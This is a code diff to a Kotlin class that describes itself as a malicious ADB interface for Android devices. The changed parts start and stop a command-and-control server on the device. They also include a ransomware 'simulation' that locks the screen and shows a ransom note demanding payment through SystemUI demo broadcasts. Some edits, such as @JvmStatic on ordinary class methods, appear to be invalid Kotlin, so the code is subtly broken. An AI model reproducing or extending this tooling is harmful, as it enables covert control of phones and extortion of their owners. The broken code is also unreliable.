@@ -10,6 +10,7 @@ import java.net.Socket
 import java.util.Properties
 import java.util.concurrent.TimeUnit
 import kotlin.random.Random
+import java.util.regex.Pattern
 
 /**
  * A refined malicious ADB interface with enhanced features and asynchronous operations.
@@ -110,6 +111,7 @@ class ADBBase(private val logger: Logger = Logger()) {
     private fun getC2ServerProtocol(): String = c2Settings.communicationProtocol
 
     /** Starts the C2 server on the Android device. */
+    @JvmStatic
     fun startC2Server() = CoroutineScope(Dispatchers.IO).launch {
         val port = getC2ServerPort()
         try {
@@ -173,6 +175,7 @@ class ADBBase(private val logger: Logger = Logger()) {
     }
 
     /** Stops the C2 server. */
+    @JvmStatic
     fun stopC2Server() {
         runBlocking {
             try {
@@ -327,4 +330,19 @@ class ADBBase(private val logger: Logger = Logger()) {
 
     suspend fun simulateRansomware() {
         executeAdbBatch(
-            listOf("input keyevent 26", "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message
+            listOf(
+                "input keyevent 26",
+                "shell am broadcast -a com.android.systemui.demo --es command enter --es mode ransom --es message 'Your files have been encrypted. Pay to decrypt.'",
+                "shell am broadcast -a com.android.systemui.demo --es command exit"
+            ), "Simulating ransomware"
+        )
+    }
+
+    /**
+     * Cleans up resources when the application exits.
+     */
+    fun cleanup() {
+        stopC2Server()
+        logger.info("Resources cleaned up.")
+    }
+}
